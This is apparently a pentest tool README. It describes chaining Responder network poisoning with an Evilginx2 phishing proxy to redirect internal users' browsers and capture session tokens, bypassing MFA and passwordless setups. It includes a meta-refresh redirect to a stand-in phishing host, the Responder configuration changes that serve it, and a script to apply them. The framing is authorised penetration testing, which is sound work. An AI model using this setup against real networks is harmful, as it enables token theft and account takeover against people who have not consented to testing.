# Attacking Passwordless, MFA and/or Zero Trust Environments using Responder and Evilgnx2

Organizations continue to improve their security posture with many implementing security mechanisms that go beyond just password authentication.  This can help prevent common attacks such as password spraying from being affective.

As defenders move past passwords, attackers can as well.  Focusing on tokens will allow us access without needing the passwords.

One method to obtain these tokens is an invisible proxy, such as [Evilgnx2](https://github.com/kgretzky/evilginx2), traditionally used in phishing attacks.

Phishing techniques are not often used in pentests, but as organizations move beyond passwords, some these techniques can be adopted.

Using [Evilgnx2](https://github.com/kgretzky/evilginx2) in conjunction with a tool like [Responder](https://github.com/lgandx/Responder) will allow internal penetration testers to utilize these techniques and capture tokens without the need for passwords.  

## The Setup
### Evilgnx2
For the most part, [Evilgnx2](https://github.com/kgretzky/evilginx2) can be setup in a standard configuration externally.  It can be a complex setup, but when finished you should have a lure URL to direct the targets to.

### Responder
We are going to use [Responder](https://github.com/lgandx/Responder) to poison any requests on the internal network.  If we can successfully poison a 
request from a browser, we can redirect the browser to our [Evilgnx2](https://github.com/kgretzky/evilginx2) server.

To do this, we will edit a couple files on our internal attack machine that will run responder.  

First we can add our redirect we will serve via HTML (the lure will need to be replaced with your unique Evilgnx2 phishing lure). A simple [302 HTML redirect file is included](./302.html) in this repo, just replace the ```LURE_GOES_HERE``` with the URL of your [Evilgnx2](https://github.com/kgretzky/evilginx2) lure.

```
<meta http-equiv="refresh" content="0; URL='https://login.evilsite.lol/RWAdlKuU'" />

```

You can either change the config in the default responder directory, or use the included [bash script](./responder_config.sh) to generate one.  

Change:
```
; Set to On to serve the custom HTML if the URL does not contain .exe
; Set to Off to inject the 'HTMLToInject' in web pages instead
Serve-Html = Off

; Custom HTML to serve
HtmlFilename = files/AccessDenied.html
```
To:
```
; Set to On to serve the custom HTML if the URL does not contain .exe
; Set to Off to inject the 'HTMLToInject' in web pages instead
Serve-Html = On

; Custom HTML to serve
HtmlFilename = files/302.html
```

or run the script.  The script will edit the Responder.conf in its default location; Read before executing.

```
bash responder_config.sh
```

Then start [Responder](https://github.com/lgandx/Responder) as you normally would using the edited config.

